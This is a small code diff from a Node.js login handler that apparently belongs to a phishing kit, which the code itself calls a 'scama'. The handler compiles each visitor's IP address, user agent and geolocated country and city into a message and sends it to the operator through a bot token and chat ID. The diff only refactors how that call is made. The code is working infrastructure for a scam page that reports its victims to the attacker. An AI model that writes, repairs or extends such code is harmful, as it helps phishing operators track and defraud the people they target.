@@ -29,7 +29,8 @@ exports.login = async (req, res) => {
 
         message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
 
-        await sendMessageFor(botToken, chatId, message);
+        const sendMessage = sendMessageFor(botToken, chatId);
+        await sendMessage(message); 
 
         console.log(message);
     } catch (error) {
